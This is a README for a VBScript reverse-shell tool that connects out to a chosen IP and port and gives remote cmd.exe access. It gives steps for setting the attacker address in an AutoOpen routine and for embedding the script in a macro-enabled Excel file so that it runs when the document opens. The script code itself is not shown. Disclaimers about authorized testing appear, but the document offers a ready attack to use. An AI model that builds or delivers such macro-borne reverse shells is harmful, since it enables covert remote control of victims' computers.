# Reverse Shell VBS Script

This VBS script establishes a reverse shell connection to a specified IP address and port. It utilizes the Windows Sockets API (ws2_32) to create a socket and connect to the specified IP and port. Once the connection is established, it opens a command prompt (cmd.exe) to allow for remote command execution.

## Prerequisites

Ensure that the Windows Script Host is enabled on the target system.

## Usage

1. Copy the script content.
2. Edit the `AutoOpen` subroutine to specify the desired IP address and port in the `Call ReverseShell("IP_ADDRESS", PORT)` line.
3. Execute the script by running it using the Windows Script Host or embedding it in a document.

**Note:** Use this script responsibly and only in environments where you have explicit permission to conduct security testing or demonstrations.

## Excel Sheet Integration

An Excel sheet (`ReverseShellScript.xlsm`) is included with the script embedded inside it. To modify the script, follow these steps:

1. Open the Excel sheet.
2. Enable Developer mode in Excel.
3. Navigate to the VBS IDE embedded in Excel.
4. Locate and edit the `AutoOpen` subroutine at the end of the script to specify the desired IP address and port in the `Call ReverseShell("IP_ADDRESS", PORT)` line.


## Important Warning

This script is intended for educational and security testing purposes only. Unauthorized use is strictly prohibited. Be aware of the legal implications and adhere to ethical guidelines when utilizing this script.

